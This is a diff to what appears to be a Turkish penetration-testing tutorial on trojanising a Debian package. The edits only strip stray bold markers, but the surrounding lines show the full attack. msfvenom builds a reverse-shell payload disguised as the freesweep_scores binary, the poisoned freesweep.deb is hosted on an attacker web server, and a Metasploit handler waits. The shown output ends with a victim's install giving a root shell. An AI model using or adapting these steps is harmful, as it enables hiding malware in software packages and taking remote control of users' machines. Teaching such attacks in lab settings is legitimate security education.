@@ -86,7 +86,7 @@ Version: 0.90-1
 Section: Games and Amusement
 Priority: optional
 Architecture: i386
-Maintainer: Ubuntu MOTU Developers **(**ubuntu-motu@lists.ubuntu.com**)**
+Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
 Description: a text-based minesweeper
  Freesweep is an implementation of the popular minesweeper game, where
  one tries to find all the mines without igniting any, based on hints given
@@ -127,7 +127,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores &amp;
 root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST**=**192.168.1.101 LPORT**=**443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 98 **(**iteration**=**0**)**
+x86/shikata_ga_nai succeeded with size 98 (iteration**=**0)
 x86/shikata_ga_nai chosen with final size 98
 Payload size: 98 bytes
 Saved as: /tmp/evil/work/usr/games/freesweep_scores
@@ -161,9 +161,9 @@ root@kali:/tmp/evil# cp freesweep.deb /var/www/
 
 ```bash
 root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
-PAYLOAD **=>** linux/x86/shell/reverse_tcp
-LHOST **=>** 192.168.1.101
-LPORT **=>** 443
+PAYLOAD => linux/x86/shell/reverse_tcp
+LHOST => 192.168.1.101
+LPORT => 443
 > Started reverse handler on 192.168.1.101:443
 > Starting the payload handler...
 ```
@@ -181,8 +181,8 @@ Herhangi bir kullanıcı, bu hazırladığımız `freesweep.deb` paketini indiri
 ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.168.1.101/freesweep.deb</a>
 ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb
 
-> Sending stage **(**36 bytes**)**
-> Command shell session 1 opened **(**192.168.1.101:443 -> 192.168.1.175:1129**)**
+> Sending stage (36 bytes)
+> Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.175:1129)
 
 ifconfig
 eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
@@ -191,14 +191,14 @@ UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
 RX packets:49 errors:0 dropped:0 overruns:0 frame:0
 TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1000
-RX bytes:43230 **(**42.2 KiB**)** TX bytes:4603 **(**4.4 KiB**)**
+RX bytes:43230 (42.2 KiB) TX bytes:4603 (4.4 KiB)
 Interrupt:17 Base address:0x1400
 ...snip...
 
 hostname
 ubuntu
 id
-uid**=**0**(**root**)** gid**=**0**(**root**)** groups**=**0**(**root**)**
+uid**=**0(root) gid**=**0(root) groups**=**0(root)
 ```
 
 
